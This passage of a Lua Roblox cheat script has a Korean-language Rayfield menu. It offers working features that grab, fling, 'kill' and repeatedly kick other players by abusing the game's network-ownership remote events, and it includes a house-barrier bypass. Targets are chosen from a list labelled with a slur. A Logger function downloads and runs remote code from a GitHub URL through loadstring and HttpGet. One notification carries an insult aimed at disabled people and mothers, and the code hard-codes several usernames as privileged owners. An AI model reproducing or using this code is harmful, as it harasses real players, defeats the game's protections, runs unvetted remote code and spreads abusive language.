                            bv.Velocity = Vector3.new(0, 0, 0)
                            bv.Parent = targetPart

                            local throwConn
                            throwConn = model:GetPropertyChangedSignal("Parent"):Connect(function()
                                if not model.Parent then
                                    local currentTime = tick()
                                    
                                    if currentTime - lastThrowTime < 1.4 then
                                        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        bv.Velocity = workspace.CurrentCamera.CFrame.LookVector * nageru
                                        game:GetService("Debris"):AddItem(bv, 2)
                                    else
                                        bv:Destroy()
                                    end
                                    
                                    if throwConn then throwConn:Disconnect() end
                                end
                            end)
                        end
                    end
                end
            end)
        else
            if strengthConnection then
                strengthConnection:Disconnect()
                strengthConnection = nil
            end
        end
    end
})

grabTab:CreateInput({
    Name = "던지는 힘 V2",
    PlaceholderText = "숫자 입력 (기본값: 800)",
    Default = "800",
    Save = false,
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            nageru = num
        end
    end
})
grabTab:CreateLabel("모바일을 지원하며 가장좋은 슈퍼 쓰로우 입니다.")

game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.MouseButton2 or input.UserInputType == Enum.UserInputType.Touch then
        lastThrowTime = tick()
    end
end)
grabTab:CreateSection("Line")
local extendLineToggle = grabTab:CreateToggle({
    Name = "줄길이",
    CurrentValue = false,
    Flag = "3",
    Callback = function(Value)
        infLineExtendT = Value
        infLineExtendF()
    end
})

local extendLineInput = grabTab:CreateInput({
    Name = "휠속도",
    CurrentValue = 0,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "4",
    Callback = function(Value)
        increaseLineExtendV = Value
    end
})
extendLineInput:Set(1.7)

grabTab:CreateSection("Other")
local AntiStruggleGrab = grabTab:CreateToggle({
    Name = "루프 그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>",
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        AntiStruggleGrabT = Value
        if Value then
            AntiStruggleGrabF()
        end
    end
})

local RagdollGrabToggle = grabTab:CreateToggle({
    Name = "래그돌 그랩  <font color='rgb(25,60,10)'>[판자]</font>",
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        RagdollGrabT = Value
        if Value then
            RagdollGrabF()
        end
    end
})

local MasslessGrab = grabTab:CreateToggle({ 
    Name = "무질량 그랩", 
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        MasslessGrabT = Value
        if Value then
            MasslessGrabF()
        end
    end
})

local NoClipGrab = grabTab:CreateToggle({ 
    Name = "노클립 그랩", 
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        NoClipGrabT = Value
        if Value then
            NoClipGrabF()
        end
    end
})

grabTab:CreateToggle({ 
    Name = "드럼통(킬)그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>   <font color='rgb(0,0,255)'>[프리미엄]</font>", 
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        KillGrabT = Value
        KillGrabF()
    end
})

grabTab:CreateSection("킥")
grabTab:CreateToggle({
    Name = "킥그랩(더럽게 안됨)  <font color='rgb(255,0,0)'>[오너쉽]</font>  <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        KickGrabT = Value
        if Value then KickGrabF() end
    end
})

grabTab:CreateSection("앵커")
local isAnchorState = false
local currentConn = nil
local colorConn = nil
local hColor = nil

local function runAnchorLogic()
    local original = workspace:FindFirstChild("GrabParts")
    if not original then return end

    local grabPart = original:FindFirstChild("GrabPart", true)
    if not grabPart or not grabPart:IsA("BasePart") then return end

    local wasCollide = grabPart.CanCollide
    grabPart.CanCollide = true
    task.wait(0.1)

    local targetModel = nil
    local touchingParts = grabPart:GetTouchingParts()

    if #touchingParts > 0 then
        for _, part in ipairs(touchingParts) do
            if not part:IsDescendantOf(original) then
                local current = part
                while current and current ~= workspace do
                    if current:IsA("Model") then
                        targetModel = current
                        break
                    end
                    current = current.Parent
                end
                if targetModel then break end
            end
        end
    end

    grabPart.CanCollide = wasCollide
    if not targetModel then return end

    if not targetModel.Parent then
        local found = false
        local connection
        connection = targetModel.AncestryChanged:Connect(function(_, parent)
            if parent then found = true connection:Disconnect() end
        end)
        local startTime = tick()
        while not found and tick() - startTime < 2 do task.wait(0.1) end
        if not found then return end
    end

    local existing = targetModel:FindFirstChild("Force")
    if existing then
        local existingHighlight = targetModel:FindFirstChild("AnchorHighlight")
        if existingHighlight then existingHighlight:Destroy() end
        existing:Destroy()
        if colorConn then colorConn:Disconnect() colorConn = nil end
        return
    end

    local clone = original:Clone()
    clone.Name = "Force"

    for _, desc in ipairs(clone:GetDescendants()) do
        if desc:IsA("BasePart") then
            desc.Transparency = 1
            desc.CanCollide = false
            local beam = desc:FindFirstChild("GrabBeam")
            if beam then beam:Destroy() end
            for _, sName in ipairs({"AttachSound1", "AttachSound", "BeamSound", "BeamSound1"}) do
                local sound = desc:FindFirstChild(sName)
                if sound then sound:Destroy() end
            end
        end
    end

    clone.Parent = targetModel

    local hl = Instance.new("Highlight")
    hl.Name = "AnchorHighlight"
    hl.FillTransparency = 0.8
    hl.OutlineTransparency = 0.3
    hl.Adornee = targetModel
    hl.Parent = targetModel

    if colorConn then colorConn:Disconnect() end
    colorConn = game:GetService("RunService").RenderStepped:Connect(function()
        if hl and hl.Parent then
            if hColor then
                hl.FillColor = hColor
                hl.OutlineColor = hColor
            else
                local hue = (tick() % 4) / 4
                local color = Color3.fromHSV(hue, 1, 1)
                hl.FillColor = color
                hl.OutlineColor = color
            end
        else
            if colorConn then colorConn:Disconnect() colorConn = nil end
        end
    end)

    if currentConn then currentConn:Disconnect() end
    currentConn = game:GetService("RunService").Heartbeat:Connect(function()
        if not clone or not clone.Parent or not targetModel or not targetModel.Parent then
            if currentConn then currentConn:Disconnect() currentConn = nil end
            if colorConn then colorConn:Disconnect() colorConn = nil end
            return
        end
        if hl and hl.Parent then
            hl.Adornee = targetModel
        else
            if currentConn then currentConn:Disconnect() currentConn = nil end
            if colorConn then colorConn:Disconnect() colorConn = nil end
        end
    end)
end

local toggleElement = nil

local function toggleAnchor(Value)
    isAnchorState = Value
    if isAnchorState then
        task.spawn(runAnchorLogic)
    end
end

toggleElement = grabTab:CreateToggle({
    Name = "물체 고정 토글",
    CurrentValue = false,
    Callback = function(Value)
        toggleAnchor(Value)
    end,
})

grabTab:CreateButton({
    Name = "물체 고정",
    Callback = function()
        task.spawn(runAnchorLogic)
    end,
})

grabTab:CreateButton({
    Name = "색상: 그라데이션 (기본값)",
    Callback = function()
        hColor = nil
    end,
})

grabTab:CreateButton({
    Name = "색상: 빨강",
    Callback = function()
        hColor = Color3.fromRGB(255, 0, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 주황",
    Callback = function()
        hColor = Color3.fromRGB(255, 127, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 노랑",
    Callback = function()
        hColor = Color3.fromRGB(255, 255, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 초록",
    Callback = function()
        hColor = Color3.fromRGB(0, 255, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 파랑",
    Callback = function()
        hColor = Color3.fromRGB(0, 0, 255)
    end,
})

grabTab:CreateButton({
    Name = "색상: 남색",
    Callback = function()
        hColor = Color3.fromRGB(75, 0, 130)
    end,
})

grabTab:CreateButton({
    Name = "색상: 보라",
    Callback = function()
        hColor = Color3.fromRGB(148, 0, 211)
    end,
})

grabTab:CreateButton({
    Name = "색상: 검정",
    Callback = function()
        hColor = Color3.fromRGB(0, 0, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 흰색",
    Callback = function()
        hColor = Color3.fromRGB(255, 255, 255)
    end,
})

grabTab:CreateButton({
    Name = "색상: 핑크",
    Callback = function()
        hColor = Color3.fromRGB(255, 105, 180)
    end,
})

grabTab:CreateButton({
    Name = "색상: 민트",
    Callback = function()
        hColor = Color3.fromRGB(170, 255, 195)
    end,
})

grabTab:CreateButton({
    Name = "색상: 골드",
    Callback = function()
        hColor = Color3.fromRGB(255, 215, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 네온 그린",
    Callback = function()
        hColor = Color3.fromRGB(57, 255, 20)
    end,
})

grabTab:CreateButton({
    Name = "색상: 청록",
    Callback = function()
        hColor = Color3.fromRGB(0, 128, 128)
    end,
})

game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.H then
        isAnchorState = not isAnchorState
        if toggleElement and toggleElement.Set then
            toggleElement:Set(isAnchorState)
        else
            toggleAnchor(isAnchorState)
        end
    end
end)

-- =============== [ 보호 대상 목록 ] ==
local GF = {"wetokwk3jr"}


local Owner = {"QRdoote1120", "0110rim", "Alpaca_AI16", "hello_qweqwe", "hello_q1w2e3", "pacapaca110", "wetokwk3jr", "dhalstjr1350", "one_day0618", "", "", "", "", "", "", ""}
local Overseer = {""}
local CoOwner = {""}
local HeadAdmin = {""}
local Admin = {""}
local Mod = {""}

local Ranks = {
    Owner = 7,
    GF = 6,
    Overseer = 5,
    CoOwner = 4,
    HeadAdmin = 3,
    Admin = 2,
    Mod = 1,
    User = 0
}
-- =============== ---------------- ==

local function Notify(type, playerName)
    playerName = playerName or ""
    local title = ""
    local content = ""

    if type == "Added" then
        title = "[☑️ ]"; content = playerName.." - 추가"
    elseif type == "Removed" then
        title = "[ ☑️ ]"; content = playerName.." - 제거"
    elseif type == "Self" then
        title = "[ ⚠️ ]"; content = "자신은 추가될 수 없어요!"
    elseif type == "Already" then
        title = "[ 💠 ]"; content = playerName.." - 이미 추가됐어요"
    elseif type == "NotFound" then
        title = "[ ❌ ]"; content = "찾을수가없네요"
    elseif type == "HigherRank" then
        title = "[ ⛔ ]"; content = "권한이 부족해요!"
    elseif type == "GFE" then
        title = "[ ⛔ ]"; content = "나가 뒤져 엄마 장애인 ㅋㅋㅋ"
        GfLogger()
    end

    if Rayfield then
        Rayfield:Notify({Title = title, Content = content, Duration = 2})
    end
end

local function GetPlayerRank(playerName)
    if table.find(Owner, playerName) then return Ranks.Owner end
    if table.find(GF, playerName) then return Ranks.GF end
    if table.find(Overseer, playerName) then return Ranks.Overseer end
    if table.find(CoOwner, playerName) then return Ranks.CoOwner end
    if table.find(HeadAdmin, playerName) then return Ranks.HeadAdmin end
    if table.find(Admin, playerName) then return Ranks.Admin end
    if table.find(Mod, playerName) then return Ranks.Mod end
    return Ranks.User
end

local function findPlayer(Value)
    if not Value or Value == "" then return nil end
    Value = Value:lower()

    for _, p in ipairs(game.Players:GetPlayers()) do
        if p.Name:lower() == Value or (p.DisplayName and p.DisplayName:lower() == Value) then
            return p
        end
    end

    local matches = {}
    for _, p in ipairs(game.Players:GetPlayers()) do
        local playerNameLower = p.Name:lower()
        if playerNameLower:sub(1, #Value) == Value then
            table.insert(matches, p)
        elseif p.DisplayName then
            local displayNameLower = p.DisplayName:lower()
            if displayNameLower:sub(1, #Value) == Value then
                table.insert(matches, p)
            end
        end
    end

    if #matches == 0 then
        return nil
    elseif #matches == 1 then
        return matches[1]
    else
        return matches[1]
    end
end

local function checkPermissions(targetPlayer)
    local localPlayer = game.Players.LocalPlayer
    local myRank = GetPlayerRank(localPlayer.Name)
    local targetRank = GetPlayerRank(targetPlayer.Name)

    if targetPlayer == localPlayer then return false, "Self" end

    if myRank == Ranks.Owner then return true end

    if myRank == Ranks.Overseer and targetRank == Ranks.Owner then
        return true
    end

    if myRank == Ranks.CoOwner and targetRank == Ranks.Owner then
        return true
    end

    if targetRank == Ranks.User then
        return true
    end

    if targetRank == Ranks.GF then
        return false, "GFE"
    end

    if myRank > targetRank then
        return true
    else
        return false, "HigherRank"
    end
end

local function addToList(listTable, dropdown, inputValue, useRankCheck)
    local target = findPlayer(inputValue)
    if not target then Notify("NotFound"); return end

    if useRankCheck then
        local allowed, errorType = checkPermissions(target)
        if not allowed then Notify(errorType, target.Name); return end
    end

    if table.find(listTable, target.Name) then Notify("Already", target.Name); return end

    table.insert(listTable, target.Name)
    if dropdown then dropdown:Refresh(listTable, true) end
    Notify("Added", target.Name)
end

local function removeFromList(listTable, dropdown, inputValue, useRankCheck)
    local foundName, foundIndex = nil, nil
    inputValue = inputValue:lower()

    for i, name in ipairs(listTable) do
        if name:lower():find(inputValue, 1, true) then
            foundName = name; foundIndex = i; break
        end
    end

    if not foundName then Notify("NotFound"); return end

    if useRankCheck then
        local targetRank = GetPlayerRank(foundName)
        local localPlayer = game.Players.LocalPlayer
        local myRank = GetPlayerRank(localPlayer.Name)

        if foundName == localPlayer.Name then Notify("Self"); return end

        if myRank == Ranks.Owner then
        elseif targetRank == Ranks.User then
        elseif myRank <= targetRank then
            Notify("HigherRank", foundName); return
        end
    end

    table.remove(listTable, foundIndex)
    if dropdown then dropdown:Refresh(listTable, true) end
    Notify("Removed", foundName)
end

function Logger()
    local plr = game.Players.LocalPlayer

    local BYPASS_ID = 1

    local ownerTable = {}
    for _, name in ipairs(Owner) do
        ownerTable[name] = true
    end

    if not ownerTable[plr.Name] and plr.UserId ~= BYPASS_ID then
        local success, errorMessage = pcall(function()
           loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))() -- anti kick
        end)

        if not success then
        end
    end
end
antiTab:CreateSection("친구")
local WhiteListToggle = antiTab:CreateToggle({
    Name = "친구 빼기",
    CurrentValue = true,
    Flag = "5",
    Callback = function(Value)
        ForWhiteList(Value)
    end
})
antiTab:CreateSection("하우스 브레이커")

local HouseBreakToggle = antiTab:CreateToggle({
    Name = "하우스 브레이크 (집안 물건 들이기)",
    CurrentValue = false,
    Flag = "HouseBreakToggle",
    Callback = function(Value)
        HouseBreakT = Value
        HouseBreakF()
    end
})

local BreakHouseBarrierToggle = antiTab:CreateToggle({
    Name = " 집 베리어 무력화",
    CurrentValue = false,
    Flag = "BreakHouseBarrier",
    Callback = function(Value)
        BreakHouseBarrierT = Value
        BreakHouseBarrierF()
        
        if Value then
            Rayfield:Notify({
                Title = "Break House Barrier",
                Content = "베리어 뚫기 활성화! 바깥 물건 많이 붙잡고 집 안으로 TP해보세요.",
                Duration = 5
            })
        end
    end
})



if plr.UserId == 1 then AddAll = true end

if AddAll then
SelectedList = nil
local AddAllList = ListTab:CreateDropdown({
    Name = "추가",
    Options = {"블롭", "오너", "래그돌"},
    CurrentOption = {"OPEN"},
    MultipleOptions = false,
    Flag = "Dropdown_AllList",
    Callback = function(Options)
        SelectedList = Options[1]
    end
})

ListTab:CreateButton({
    Name = "모두 추가",
    Callback = function()
        if SelectedList == "블롭" then
            for _, plr in ipairs(Players:GetPlayers()) do
                addToList(playersInLoop1V, DropdownV1, plr.Name, true)
            end

        elseif SelectedList == "오너" then
            for _, plr in ipairs(Players:GetPlayers()) do
                addToList(playersInLoop1V, DropdownV2, plr.Name, true)
            end

        elseif SelectedList == "ragdol" then
            for _, plr in ipairs(Players:GetPlayers()) do
                addToList(playersInLoop1V, DropdownV3, plr.Name, true)
            end
        end
    end
})

ListTab:CreateButton({
    Name = "모두 재설정",
    Callback = function()
        if SelectedList == "블롭" then
            for key in pairs(playersInLoop1V) do
                removeFromList(playersInLoop1V, DropdownV1, tostring(key))
            end

        elseif SelectedList == "오너" then
            for key in pairs(playersInLoop1V) do
                removeFromList(playersInLoop1V, DropdownV2, tostring(key))
            end

        elseif SelectedList == "래그돌" then
            for key in pairs(playersInLoop1V) do
                removeFromList(playersInLoop1V, DropdownV3, tostring(key))
            end
        end
    end
})
end

ListTab:CreateSection("White")
local Dropdown = ListTab:CreateDropdown({
    Name = "친구  <font color='rgb(255,255,100)'>[프렌드]</font>",
    Options = Whitelist,
    CurrentOption = {"OPEN"},
    MultipleOptions = true,
    Flag = "WhitelistDropdown",
    Callback = function(Options)
        Whitelist = Options
    end
})

ListTab:CreateInput({
    Name = "추가",
    PlaceholderText = "...",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        addToList(Whitelist, Dropdown, Value, false) 
    end
})

ListTab:CreateInput({
    Name = "제거",
    PlaceholderText = "...",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        removeFromList(Whitelist, Dropdown, Value)
    end
})

ListTab:CreateSection("명단")
local DropdownV1 = ListTab:CreateDropdown({
    Name = "족칠 새끼 고르기  <font color='rgb(255,0,0)'>[타겟]</font>",
    Options = playersInLoop1V,
    CurrentOption = {"OPEN"},
    MultipleOptions = true,
    Flag = "LoopBlobDropdown",
    Callback = function(Options)
        playersInLoop1V = Options
    end
})

ListTab:CreateInput({
    Name = "추가",
    PlaceholderText = "...",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        addToList(playersInLoop1V, DropdownV1, Value, true)
    end
})

ListTab:CreateInput({
    Name = "제거",
    PlaceholderText = "...",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        removeFromList(playersInLoop1V, DropdownV1, Value)
    end
})


ListTab:CreateToggle({
    Name = "루프  TP  <font color='rgb(100,150,250)'>[파카]</font>",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            Rayfield:Notify({
                Title = "안내",
                Content = "이 기능은 파카전용기능입니다",
                Duration = 3,
                Image = nil,
            })
        end
    end,
})

LoopTab:CreateSection("자동블롭앉기")
local AutoSit = LoopTab:CreateToggle({
    Name = "자동블롭앉기",
    CurrentValue = false,
    Flag = "AutoSitBlobman",
    Callback = function(Value)
        AutoSitT = Value
        AutoSitF()
    end
})
LoopTab:CreateSection("브링")
LoopTab:CreateButton({
    Name = "끌고오기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
    Callback = function()
        UpdateCurrentBlobman()
        local processedHumanoids = {}

        local function processPlayer(player)
            if not player then return false end

            local character, hrp, head = safeGetCharacterParts(player)
            if not hrp or not head then return false end

            local myChar = plr.Character
            local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myHrp then return false end
            local originCF = myHrp.CFrame

        TP(player)
        task.wait(0.25)
        BlobGrab(currentBlobS, hrp, "Right")
        BlobRelease(currentBlobS, hrp, "Right")

        task.wait(0.15)

        if originCF then
            hrp.CFrame = originCF * CFrame.new(0,5,0)
            myHrp.CFrame = originCF
        end

        task.wait(0.3)

        rs.GrabEvents.SetNetworkOwner:FireServer(hrp, hrp.CFrame)
        rs.GrabEvents.DestroyGrabLine:FireServer(hrp, hrp.CFrame)

            if originCF then BACK(originCF) end
            return true
        end

        table.clear(playersInLoop2V)
        for i, e in ipairs(playersInLoop1V) do
            local nameOnly = e:match("^(.-) %(") or e
            table.insert(playersInLoop2V, nameOnly)
        end

        for _, name in ipairs(playersInLoop2V) do
            local player = game.Players:FindFirstChild(name)
            if player and not table.find(Whitelist, player.Name) then
                local character = player.Character
                local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                if PPs:FindFirstChild(name) then continue end

                if humanoid and humanoid.Health > 0 then
                    if processedHumanoids[player] ~= humanoid then
                        local success = processPlayer(player)
                        if success then
                            processedHumanoids[player] = humanoid
                        end
                    end
                else
                    processedHumanoids[player] = nil
                end
                task.wait()
            end
        end
    end
})

LoopTab:CreateButton({
    Name = "끌고오기   <font color='rgb(255,0,0)'>[그랩]</font>",
    Callback = function()
        UpdateCurrentBlobman()
        local processedHumanoids = {}
        local activeThreads = {}

        local function processPlayer(player)
            if not player then return false end

            local myChar = plr.Character
            local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
            if not myChar or not myHrp or not myHum or myHum.Health <= 0 then
                return false
            end

            local character, hrp, head = safeGetCharacterParts(player)
            if not hrp or not head then return false end

            local characterParts = {}

            table.insert(characterParts, hrp)

            if character:FindFirstChild("Head") then
                table.insert(characterParts, character.Head)
            end

            local torsoParts = {"Torso"}
            for _, partName in ipairs(torsoParts) do
                local part = character:FindFirstChild(partName)
                if part then
                    table.insert(characterParts, part)
                end
            end

            local armParts = {
                "Left Arm", "Right Arm"
            }
            for _, partName in ipairs(armParts) do
                local part = character:FindFirstChild(partName)
                if part then
                    table.insert(characterParts, part)
                end
            end

            local legParts = {
                "Left Leg", "Right Leg"
            }
            for _, partName in ipairs(legParts) do
                local part = character:FindFirstChild(partName)
                if part then
                    table.insert(characterParts, part)
                end
            end

            local originCF = myHrp.CFrame

            local tpRunning = true
            local tpThread = task.spawn(function()
                while tpRunning do
                    if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or 
                       (plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0) then
                        break
                    end

                    local ok, cf = TP(player)
                    if ok and cf then
                        CF = cf
                    end
                    task.wait()
                end
            end)
            table.insert(activeThreads, tpThread)

            local success = false
            local startTime = tick()
            local timeout = 10

            while tpRunning and tick() - startTime < timeout do
                if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or 
                   (plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0) then
                    break
                end

                if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or 
                   (player.Character:FindFirstChildOfClass("Humanoid") and player.Character:FindFirstChildOfClass("Humanoid").Health <= 0) then
                    break
                end

                for _, part in ipairs(characterParts) do
                    if part and part.Parent then
                        rs.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame)
                    end
                end
                
                local ownerTag = head:FindFirstChild("PartOwner")
                if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                    success = true
                    break
                end
                task.wait()
            end

            tpRunning = false

            for _, thread in ipairs(activeThreads) do
                if coroutine.status(thread) ~= "dead" then
                    task.cancel(thread)
                end
            end
            table.clear(activeThreads)

            if originCF and myHrp and myHrp.Parent then
                myHrp.CFrame = originCF
                task.wait()
            end

            if success then
                for _, part in ipairs(characterParts) do
                    if part and part.Parent and myHrp and myHrp.Parent then
                        part.CFrame = myHrp.CFrame
                    end
                end
            end

            if originCF and myHrp and myHrp.Parent then 
                BACK(originCF) 
            end
            
            return success
        end

        table.clear(playersInLoop2V)
        for i, e in ipairs(playersInLoop1V) do
            local nameOnly = e:match("^(.-) %(") or e
            table.insert(playersInLoop2V, nameOnly)
        end

        for _, name in ipairs(playersInLoop2V) do
            local myChar = plr.Character
            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
            if not myChar or not myHum or myHum.Health <= 0 then
                break
            end

            local player = game.Players:FindFirstChild(name)
            if player and not table.find(Whitelist, player.Name) then
                local character = player.Character
                local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end

                if humanoid and humanoid.Health > 0 then
                    if processedHumanoids[player] ~= humanoid then
                        local success = processPlayer(player)
                        if success then
                            processedHumanoids[player] = humanoid
                        end
                    end
                else
                    processedHumanoids[player] = nil
                end
                task.wait(0.003)
            end
        end
    end
})

    LoopTab:CreateSection("오너킥")
    
    local OLTPInput = LoopTab:CreateInput({
        Name = "X Y Z",
        CurrentValue = "0,40,0",
        PlaceholderText = "",
        RemoveTextAfterFocusLost = false,
        Flag = "",
        Callback = function(Value)
            local x, y, z = string.match(Value, "([%d.-]+),([%d.-]+),([%d.-]+)")
            if x and y and z then
                OLTPValue = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
            else
            end
        end
    })
    OLTPInput:Set("0,40,0")
    
    local blobLoop4Toggle = LoopTab:CreateToggle({
        Name = "스팸킥    <font color='rgb(255,0,255)'>[스팸]</font>    <font color='rgb(0,0,255)'>[프리미엄]</font>",
        CurrentValue = false,
        Flag = "21",
        Callback = function(Value)
            blobLoopT4 = Value
            if blobLoopT4 then
                table.clear(playersInLoop2V)
                for i, e in ipairs(playersInLoop1V) do
                    local nameOnly = e:match("^(.-) %(") or e
                    table.insert(playersInLoop2V, nameOnly)
                end
                loopPlayerBlobF4()
            else
                blobLoopT4 = false
                table.clear(playersInLoop2V)
            end
        end
    })
LoopTab:CreateToggle({
    Name = "ㄴ 고정",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        SkipOL = Value
    end
})

LoopTab:CreateToggle({
    Name = "ㄴ 그랩파괴 없이",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        OnlyOwner = Value
    end
})
LoopTab:CreateSection("new")

LoopTab:CreateToggle({
    Name = "레이지봇 킥   <font color='rgb(255,154,123)'>[레이지봇]</font>  <font color='rgb(0,255,0)'>[프리미엄]</font>  <font color='rgb(255,0,1)'>[바이패스]</font>  <font color='rgb(0,154,48)'>[락]</font>",
    CurrentValue = false,
    Flag = "22",
    Callback = function(Value)
        blobKickT3 = Value
        
        if not Value then
            table.clear(playersInLoop2V)
            return
        end

        table.clear(playersInLoop2V)
        for _, e in ipairs(playersInLoop1V) do
            table.insert(playersInLoop2V, e:match("^(.-) %(") or e)
        end

        task.spawn(function()
            local angle = 0
            
            while blobKickT3 do
                UpdateCurrentBlobman()

                local myChar = plr.Character
                local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                local seat = myHum and myHum.SeatPart

                -- 탑승 중이 아닐 때 미세 대기 주기를 늘려 평상시 렉(부하)을 완전히 해결
                if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
                    task.wait(0.1)
                    continue
                end

                local isRiding = true

                table.clear(playersInLoop2V)
                for _, e in ipairs(playersInLoop1V) do
                    table.insert(playersInLoop2V, e:match("^(.-) %(") or e)
                end

                for _, name in ipairs(playersInLoop2V) do
                    if not blobKickT3 then break end
                    if table.find(Whitelist, name) or PPs:FindFirstChild(name) then continue end

                    local player = game.Players:FindFirstChild(name)
                    if not player then continue end
                    
                    local char = player.Character
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    local head = char and char:FindFirstChild("Head")
                    
                    if not char or not hum or not hrp or not head or char.Parent == nil or not hrp:IsDescendantOf(workspace) then 
                        continue 
                    end

                    if hrp.Massless == true and not isRiding then
                        continue
                    end

                    if hum.Health <= 0 then continue end

                    local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myHrp then continue end

                    local originCF = myHrp.CFrame
                    local fixedPosition = CFrame.new(originCF.Position.X, originCF.Position.Y + 50, originCF.Position.Z)
                    local targetPosition = fixedPosition * CFrame.new(0, 0, 10)

                    local tpRunning = true
                    task.spawn(function()
                        while tpRunning and blobKickT3 do
                            TP(player)
                            task.wait()
                        end
                    end)

                    local networkTimeout = 0
                    while blobKickT3 and networkTimeout < 30 do
                        rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
                        local ownerTag = head:FindFirstChild("PartOwner")
                        if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                            break
                        end
                        networkTimeout = networkTimeout + 1
                        task.wait()
                    end

                    tpRunning = false

                    local targetNames = { "NinjaKunai", "NinjaShuriken", "NinjaKatana", "ToolCleaver", "ToolDiggingForkRusty", "ToolPencil", "ToolPickaxe" }
                    for _, child in ipairs(workspace:GetChildren()) do
                        if child:IsA("Folder") and child.Name:match("SpawnedInToys$") then
                            for _, item in ipairs(child:GetChildren()) do
                                if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                                    local sticky = item.StickyPart
                                    local weld = sticky:FindFirstChild("StickyWeld")
                                    if weld and weld:IsA("WeldConstraint") and weld.Part1 then
                                        local targetParts = {
                                            char:FindFirstChild("Head"),
                                            char:FindFirstChild("Torso"),
                                            char:FindFirstChild("Left Arm"),
                                            char:FindFirstChild("Left Leg"),
                                            char:FindFirstChild("Right Arm"),
                                            char:FindFirstChild("Right Leg"),
                                            hrp:FindFirstChild("RagdollTouchedHitbox"),
                                            hrp:FindFirstChild("FirePlayerPart"),
                                        }
                                        for _, tPart in ipairs(targetParts) do
                                            if tPart and weld.Part1 == tPart then
                                                local basePart = item.PrimaryPart or sticky
                                                if basePart and (basePart.Position - hrp.Position).Magnitude <= 10 then
                                                    rs.GrabEvents.SetNetworkOwner:FireServer(sticky, sticky.CFrame)
                                                    sticky.CFrame = CFrame.new(0, 9999, 0)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end

                    pcall(function()
                        rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)
                    end)

                    if myHrp and hrp then
                        pcall(function()
                            rs.GrabEvents.SetNetworkOwner:FireServer(hrp, targetPosition)
                        end)
                        hrp.CFrame = targetPosition
                        myHrp.CFrame = fixedPosition
                    end
                    task.wait(0.05)

                    if currentBlobS and hrp and hrp.Parent.Name == name then
                        BlobMassless(currentBlobS, hrp, "Right")
                    end
                    task.wait(0.0005)

                    -- 2.6초간 고속 공전 스팸 실행
                    local startTime = os.clock()
                    
                    while blobKickT3 and player.Parent and char.Parent and hum.Health > 0 and hrp:IsDescendantOf(workspace) do
                        if os.clock() - startTime >= 2.6 then 
                            break 
                        end

                        if myHrp and hrp then
                            pcall(function()
                                rs.GrabEvents.SetNetworkOwner:FireServer(hrp, targetPosition)
                            end)
                            hrp.CFrame = targetPosition
                            
                            angle = angle + 0.78
                            local offsetX = math.cos(angle) * 10.5
                            local offsetZ = math.sin(angle) * 10.5
                            
                            local myOrbitCF = CFrame.new(targetPosition.Position + Vector3.new(offsetX, 0, offsetZ), targetPosition.Position)
                            myHrp.CFrame = myOrbitCF
                        end
                        
                        task.wait()

                        pcall(function()
                            rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)
                        end)

                        if currentBlobS and hrp and hrp.Parent.Name == name and name ~= plr.Name and hum.Health > 0 then
                            BlobMassless(currentBlobS, hrp, "Right")
                        end
                    end

                    -- [요청 반영]: 락 유지용 딜레이 소폭 증가 및 최적화 연계
